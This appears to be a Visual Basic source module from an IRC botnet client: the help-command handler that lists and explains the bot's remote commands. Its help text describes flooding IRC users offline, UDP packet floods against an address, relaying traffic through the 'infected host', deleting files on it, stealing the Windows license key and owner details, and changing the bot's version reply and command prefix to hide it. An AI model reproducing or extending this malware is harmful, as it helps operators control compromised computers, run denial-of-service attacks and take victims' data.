Attribute VB_Name = "modHelpSystem"
Option Explicit

Public Sub HelpSystem(sParams As String, nIndex As Integer)
    On Error GoTo ErrTrap
    Dim sArray() As String, sCommand As String, sTemp As String
    sParams$ = Trim$(sParams$)
    sArray() = Split(sParams$, " ")
    If sParams$ = "" Then
        sCommand$ = "PASS LOGOUT SERVER BNC BNCSTOP PROXY PROXYSTOP FLOOD FLOODSTOP PACKET PACKETSTOP " & _
                    "QUIT PART JOIN VERSION SAY PREFIX IP LICENSE OS OWNER COMPANY TIME DATE ENUMSERVERS " & _
                    "BRIDGE BRIDGESTOP "
        Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & sCommand$ & vbCrLf)
    Else
        sArray(0) = UCase$(sArray(0))
        If sArray(0) = "PASS" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PASS <password> [new pass]" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Allows user to log into the bot and also allows the changing of the bot's" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "password if the [new pass] parameter is used. Only one person may be" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "logged in at a time." & vbCrLf)
        ElseIf sArray(0) = "LOGOUT" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "LOGOUT" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Logs you out of the bot." & vbCrLf)
        ElseIf sArray(0) = "SERVER" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SERVER <address> [port]" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Makes the bot change servers that its running on. The bot will rejoin the" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "same channel it was in on the previous server." & vbCrLf)
        ElseIf sArray(0) = "BNC" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "BNC" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "The bot will now listen for connections on a random port and allow relaying" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "from the user's machine to the desired host." & vbCrLf)
        ElseIf sArray(0) = "BNCSTOP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "BNCSTOP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Closes all sockets related with BNC connections." & vbCrLf)
        ElseIf sArray(0) = "PROXY" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PROXY" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "The bot will now listen for connections on a random port and allow relaying" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "from the user's machines to the desired host. This uses the HTTP protocol." & vbCrLf)
        ElseIf sArray(0) = "PROXYSTOP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PROXYSTOP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Closes all sockets related with the Proxy connections." & vbCrLf)
        ElseIf sArray(0) = "FLOOD" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "FLOOD <#channel/nick> <count>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Allows the user to force the bot to flood a nick or channel with random text" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "in an attempt to freeze their client or kick them offline. You may only" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "flood one nick or channel at a time." & vbCrLf)
        ElseIf sArray(0) = "FLOODSTOP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "FLOODSTOP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Stops all flooding in progress." & vbCrLf)
        ElseIf sArray(0) = "PACKET" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PACKET <address> <count> <size>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Allows the user to have the bot send UDP packets to a given address with the" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "payload being <size> bytes of random data. These packets are sent over and over" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "to a random port <count> amount of times." & vbCrLf)
        ElseIf sArray(0) = "PACKETSTOP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PACKETSTOP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Stops all packeting in progress." & vbCrLf)
        ElseIf sArray(0) = "QUIT" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "QUIT" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "The bot will close all sockets and shut itself down." & vbCrLf)
        ElseIf sArray(0) = "PART" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PART" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "The bot will leave its current channel." & vbCrLf)
        ElseIf sArray(0) = "JOIN" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "JOIN <#channel>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "The bot will leave its current channel and join a new channel of your choice." & vbCrLf)
        ElseIf sArray(0) = "VERSION" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "VERSION <version>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Allows you to change the version reply on the bot. This is good for helping to" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "hide the identity of the daemon running the bots." & vbCrLf)
        ElseIf sArray(0) = "SAY" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SAY <text>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will make the bot PRIVMSG it's current channel with the text you specify." & vbCrLf)
        ElseIf sArray(0) = "DIR" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "DIR" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will give the directory listing for the current directory of the infected host." & vbCrLf)
        ElseIf sArray(0) = "DEL" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "DEL <file>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will delete the file specified form the current directory of the infected host." & vbCrLf)
        ElseIf sArray(0) = "CD" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "CD <directory>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will change the current directory to the specified one." & vbCrLf)
        ElseIf sArray(0) = "PREFIX" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "PREFIX <prefix>" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will change the command prefix to whatever you specify. This is good for making" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "it harder to figure out what trigger the bot will listen for." & vbCrLf)
        ElseIf sArray(0) = "IP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "IP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the current local IP address of the bot." & vbCrLf)
        ElseIf sArray(0) = "LICENSE" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "LICENSE" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the Windows license key if the infected system is a Windows 9x box." & vbCrLf)
        ElseIf sArray(0) = "OS" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "OS" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the Operating System that the bot is on." & vbCrLf)
        ElseIf sArray(0) = "OWNER" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "OWNER" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the registered owner of the box that the bot is on." & vbCrLf)
        ElseIf sArray(0) = "COMPANY" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "COMPANY" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the registered company of the box that the bot is on." & vbCrLf)
        ElseIf sArray(0) = "TIME" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "TIME" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the current time of the box that the bot is on." & vbCrLf)
        ElseIf sArray(0) = "DATE" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "DATE" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the current date of the box that the bot is on." & vbCrLf)
        ElseIf sArray(0) = "MAC" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "MAC" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the MAC address of the adapter in use." & vbCrLf)
        ElseIf sArray(0) = "ENUMSERVERS" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "ENUMSERVERS [flags]" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will return the current servers on the network that the bot is on." & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Pass following flags to look for specific server types." & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Flags:" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_WORKSTATION, SV_TYPE_SERVER, SV_TYPE_SQLSERVER, SV_TYPE_DOMAIN_CTRL" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_DOMAIN_BAKCTRL, SV_TYPE_TIME_SOURCE, SV_TYPE_AFP, SV_TYPE_NOVELL" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_DOMAIN_MEMBER, SV_TYPE_PRINTQ_SERVER, SV_TYPE_DIALIN_SERVER" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_SERVER_UNIX, SV_TYPE_NT, SV_TYPE_WFW, SV_TYPE_SERVER_MFPN" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_SERVER_NT, SV_TYPE_POTENTIAL_BROWSER, SV_TYPE_BACKUP_BROWSER" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_MASTER_BROWSER, SV_TYPE_DOMAIN_MASTER, SV_TYPE_SERVER_OSF" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_SERVER_VMS, SV_TYPE_WINDOWS, SV_TYPE_DFS, SV_TYPE_CLUSTER_NT" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_DCE, SV_TYPE_ALTERNATE_XPORT, SV_TYPE_LOCAL_LIST_ONLY" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "SV_TYPE_DOMAIN_ENUM, SV_TYPE_ALL, SV_TYPE_XENIX_SERVER" & vbCrLf)
        ElseIf sArray(0) = "BRIDGE" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "BRIDGE <type> <server>[:port] <#channel> [nick]" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will spawn a bot to logon to <server> on [port] and join <#channel>." & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "If [nick] is set then the bot will use that nick for the spawn else it" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "will use a random nick. <type> needs to be filled in with <-, <-> or ->" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "depending on the desired bridging. <- means the bot will relay from the" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "specified channel to the main bot's current channel. <-> will relay two" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "all data from both channels to each other. -> will relay from the main" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "bot's channel to the spawn's channel." & vbCrLf)
        ElseIf sArray(0) = "BRIDGESTOP" Then
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "BRIDGESTOP" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "-" & vbCrLf)
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & "Will stop all current bridges from this bot." & vbCrLf)
        Else
            Call frmMain.socket(nIndex%).SendData("NOTICE " & Bot.LoginNick & " :" & sCommand$ & vbCrLf)
        End If
    End If
Exit Sub
ErrTrap:
End Sub

